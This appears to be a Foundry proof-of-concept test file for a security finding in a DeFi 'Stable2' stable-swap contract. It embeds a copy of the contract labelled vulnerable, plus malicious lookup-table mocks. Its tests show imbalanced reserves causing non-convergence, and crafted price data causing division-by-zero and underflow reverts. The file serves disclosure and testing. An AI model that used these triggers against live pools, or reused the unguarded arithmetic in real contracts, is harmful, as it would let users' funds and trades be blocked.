// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

/* ========== VULNERABLE Stable2 CONTRACT (Self-Contained) ========== */
// All necessary interfaces and the full contract are included here for a minimal PoC.

interface ILookupTable {
    struct PriceData { uint256 lowPrice; uint256 highPrice; uint256 lowPriceI; uint256 lowPriceJ; uint256 highPriceI; uint256 highPriceJ; uint256 precision; }
    function getRatiosFromPriceSwap(uint256 targetPrice) external view returns (PriceData memory);
    function getRatiosFromPriceLiquidity(uint256 targetPrice) external view returns (PriceData memory);
    function getAParameter() external view returns (uint256);
}
interface IBeanstalkWellFunction { function calcReserveAtRatioSwap(uint256[] memory, uint256, uint256[] memory, bytes calldata) external view returns (uint256); }
interface IMultiFlowPumpWellFunction is IBeanstalkWellFunction {}
abstract contract ProportionalLPToken2 {
    function getTokens() public view virtual returns (address[] memory);
}

contract Stable2 is ProportionalLPToken2, IMultiFlowPumpWellFunction {
    struct PriceData { uint256 targetPrice; uint256 currentPrice; uint256 newPrice; uint256 maxStepSize; ILookupTable.PriceData lutData; }
    uint256 constant N = 2;
    uint256 constant A_PRECISION = 100;
    uint256 constant PRICE_PRECISION = 1e6;
    uint256 constant PRICE_THRESHOLD = 10;
    address immutable lookupTable;
    uint256 immutable a;
    error InvalidTokenDecimals();
    error InvalidLUT();
    constructor(address lut) {
        if (lut == address(0)) revert InvalidLUT();
        lookupTable = lut;
        a = ILookupTable(lut).getAParameter();
    }
    function getTokens() public view virtual override returns (address[] memory) { revert("Not needed for PoC"); }
    function calcLpTokenSupply(uint256[] memory reserves, bytes memory data) public view returns (uint256 lpTokenSupply) {
        if (reserves[0] == 0 && reserves[1] == 0) return 0;
        uint256[] memory decimals = decodeWellData(data);
        uint256[] memory scaledReserves = getScaledReserves(reserves, decimals);
        uint256 Ann = a * N * N;
        uint256 sumReserves = scaledReserves[0] + scaledReserves[1];
        lpTokenSupply = sumReserves;
        for (uint256 i = 0; i < 255; i++) {
            bool stableOscillation;
            uint256 dP = lpTokenSupply;
            if (scaledReserves[0] == 0 || scaledReserves[1] == 0) revert("Division by zero in dP calc");
            dP = dP * lpTokenSupply / (scaledReserves[0] * N);
            dP = dP * lpTokenSupply / (scaledReserves[1] * N);
            uint256 prevReserves = lpTokenSupply;
            lpTokenSupply = (Ann * sumReserves / A_PRECISION + (dP * N)) * lpTokenSupply / (((Ann - A_PRECISION) * lpTokenSupply / A_PRECISION) + ((N + 1) * dP));
            if (lpTokenSupply > prevReserves) {
                if (lpTokenSupply - prevReserves <= 1) return lpTokenSupply;
                if (lpTokenSupply - prevReserves == 2) { if (stableOscillation) return lpTokenSupply - 1; stableOscillation = true; }
            } else {
                if (prevReserves - lpTokenSupply <= 1) return lpTokenSupply;
                if (prevReserves - lpTokenSupply == 2) { if (stableOscillation) return lpTokenSupply + 1; stableOscillation = true; }
            }
        }
        revert("Non convergence: calcLpTokenSupply");
    }
    function calcReserve(uint256[] memory reserves, uint256 j, uint256 lpTokenSupply, bytes memory data) public view returns (uint256 reserve) {
        uint256[] memory decimals = decodeWellData(data);
        (uint256 c, uint256 b) = getBandC(a*N*N, lpTokenSupply, j==0 ? getScaledReserves(reserves, decimals)[1] : getScaledReserves(reserves, decimals)[0]);
        reserve = lpTokenSupply;
        uint256 prevReserve;
        for (uint256 i; i < 255; ++i) {
            prevReserve = reserve;
            reserve = (reserve * reserve + c) / (reserve * 2 + b - lpTokenSupply);
            if (reserve > prevReserve) { if (reserve - prevReserve <= 1) return reserve / (10 ** (18 - decimals[j])); }
            else { if (prevReserve - reserve <= 1) return reserve / (10 ** (18 - decimals[j])); }
        }
        revert("Non convergence: calcReserve");
    }
    function calcReserveAtRatioSwap(uint256[] memory reserves, uint256 j, uint256[] memory ratios, bytes calldata data) public view virtual override returns (uint256) {
        uint256 i = j == 1 ? 0 : 1;
        uint256[] memory decimals = decodeWellData(data);
        uint256[] memory scaledReserves = getScaledReserves(reserves, decimals);
        PriceData memory pd;
        uint256[] memory scaledRatios = getScaledReserves(ratios, decimals);
        pd.targetPrice = scaledRatios[i] * PRICE_PRECISION / scaledRatios[j];
        pd.lutData = ILookupTable(lookupTable).getRatiosFromPriceSwap(pd.targetPrice);
        uint256 lpTokenSupply = calcLpTokenSupply(scaledReserves, abi.encode(18, 18));
        uint256 parityReserve = lpTokenSupply / 2;
        if (percentDiff(pd.lutData.highPrice, pd.targetPrice) > percentDiff(pd.lutData.lowPrice, pd.targetPrice)) {
            scaledReserves[j] = parityReserve * pd.lutData.lowPriceJ / pd.lutData.precision;
        } else {
            scaledReserves[j] = parityReserve * pd.lutData.highPriceJ / pd.lutData.precision;
        }
        pd.maxStepSize = scaledReserves[j] * (pd.lutData.lowPriceJ - pd.lutData.highPriceJ) / pd.lutData.lowPriceJ;
        return updateReserve(pd, scaledReserves[j]);
    }
    function decodeWellData(bytes memory data) public view virtual returns (uint256[] memory decimals) { (uint256 d0, uint256 d1) = abi.decode(data, (uint256, uint256)); decimals = new uint256[](2); decimals[0] = d0 == 0 ? 18 : d0; decimals[1] = d1 == 0 ? 18 : d1; }
    function getScaledReserves(uint256[] memory reserves, uint256[] memory decimals) internal pure returns (uint256[] memory s) { s = new uint256[](2); s[0] = reserves[0] * 10**(18 - decimals[0]); s[1] = reserves[1] * 10**(18 - decimals[1]); }
    function getBandC(uint256 Ann, uint256 D, uint256 r) private pure returns (uint256 c, uint256 b) { c = D*D/(r*N)*D*A_PRECISION/(Ann*N); b = r+(D*A_PRECISION/Ann); }
    function updateReserve(PriceData memory pd, uint256 reserve) internal pure returns (uint256) {
        uint256 priceDiff = pd.lutData.highPrice - pd.lutData.lowPrice;
        if (pd.targetPrice > pd.currentPrice) { return reserve - pd.maxStepSize * (pd.targetPrice - pd.currentPrice) / priceDiff; }
        else { return reserve + pd.maxStepSize * (pd.currentPrice - pd.targetPrice) / priceDiff; }
    }
    function percentDiff(uint256 _a, uint256 _b) internal pure returns (uint256) { if (_a == _b) return 0; uint256 diff = _a > _b ? _a - _b : _b - _a; return (diff * 100 * 1e18) / ((_a + _b) / 2); }
}

/* ========== MOCK LUTS ========== */
contract GoodLUT is ILookupTable {
    function getAParameter() external pure returns (uint256) { return 100; }
    function getRatiosFromPriceSwap(uint256) external pure returns (PriceData memory) { revert("Not needed"); }
    function getRatiosFromPriceLiquidity(uint256) external pure returns (PriceData memory) { revert("Not needed"); }
}
contract MaliciousLUT_EqualPrices is ILookupTable {
    function getAParameter() external pure returns (uint256) { return 100; }
    function getRatiosFromPriceSwap(uint256) external pure returns (PriceData memory) { return PriceData({ lowPrice: 1e6, highPrice: 1e6, lowPriceI: 1e18, lowPriceJ: 1e18, highPriceI: 1e18, highPriceJ: 1e18, precision: 1e6 }); }
    function getRatiosFromPriceLiquidity(uint256) external pure returns (PriceData memory) { return PriceData({ lowPrice: 1e6, highPrice: 1e6, lowPriceI: 1e18, lowPriceJ: 1e18, highPriceI: 1e18, highPriceJ: 1e18, precision: 1e6 }); }
}
contract MaliciousLUT_InvertedJ is ILookupTable {
    function getAParameter() external pure returns (uint256) { return 100; }
    function getRatiosFromPriceSwap(uint256) external pure returns (PriceData memory) { return PriceData({ lowPrice: 9e5, highPrice: 11e5, lowPriceI: 1e18, lowPriceJ: 9e17, highPriceI: 1e18, highPriceJ: 11e17, precision: 1e6 }); }
    function getRatiosFromPriceLiquidity(uint256) external pure returns (PriceData memory) { return PriceData({ lowPrice: 9e5, highPrice: 11e5, lowPriceI: 1e18, lowPriceJ: 9e17, highPriceI: 1e18, highPriceJ: 11e17, precision: 1e6 }); }
}

/* ========== UNIFIED TEST DRIVER ========== */
contract UnifiedPoC is Test {
    Stable2 stable_good_lut;
    Stable2 stable_equal_prices_lut;
    Stable2 stable_inverted_j_lut;

    function setUp() public {
        stable_good_lut = new Stable2(address(new GoodLUT()));
        stable_equal_prices_lut = new Stable2(address(new MaliciousLUT_EqualPrices()));
        stable_inverted_j_lut = new Stable2(address(new MaliciousLUT_InvertedJ()));
    }

    function test_PoC_ImbalancedReserves_Reverts() public {
        console.log("--- Running Test #1: Imbalanced Reserves (Original Finding) ---");
        uint256[] memory reserves = new uint256[](2);
        reserves[0] = 500_000e18;
        reserves[1] = 1_988_011_988_011_988_011;
        bytes memory data = abi.encode(uint256(18), uint256(18));

        vm.expectRevert("Non convergence: calcLpTokenSupply");
        stable_good_lut.calcLpTokenSupply(reserves, data);
        console.log("SUCCESS: Imbalanced reserves caused revert as expected.");
    }

    function test_PoC_MaliciousLUT_EqualPrices_Reverts() public {
        console.log("--- Running Test #2: Malicious LUT (Division by Zero) ---");
        (uint256[] memory r, uint256[] memory ratios, bytes memory d) = _balanced();

        vm.expectRevert(stdError.divisionError);
        stable_equal_prices_lut.calcReserveAtRatioSwap(r, 0, ratios, d);
        console.log("SUCCESS: Malicious LUT (EqualPrices) caused revert as expected.");
    }

    function test_PoC_MaliciousLUT_InvertedJ_Reverts() public {
        console.log("--- Running Test #3: Malicious LUT (Arithmetic Underflow) ---");
        (uint256[] memory r, uint256[] memory ratios, bytes memory d) = _balanced();

        vm.expectRevert(stdError.arithmeticError);
        stable_inverted_j_lut.calcReserveAtRatioSwap(r, 0, ratios, d);
        console.log("SUCCESS: Malicious LUT (InvertedJ) caused revert as expected.");
    }

    function test_Control_NormalOperation_Succeeds() public {
        console.log("--- Running Control Test: Normal Operation ---");
        uint256[] memory reserves = new uint256[](2);
        reserves[0] = 1_000_000e18;
        reserves[1] = 1_000_001e18;
        bytes memory data = abi.encode(uint256(18), uint256(18));

        uint256 lpTokenSupply = stable_good_lut.calcLpTokenSupply(reserves, data);
        assertTrue(lpTokenSupply > 0, "Normal operation should produce LP tokens");
        console.log("SUCCESS: Normal operation works as expected.");
    }

    function _balanced() internal pure returns (uint256[] memory reserves, uint256[] memory ratios, bytes memory data) {
        reserves = new uint256[](2);
        ratios   = new uint256[](2);
        reserves[0] = 1e18; reserves[1] = 1e18;
        ratios[0]   = 1e6;  ratios[1]   = 1e6;
        data = abi.encode(uint256(18), uint256(18));
    }
}
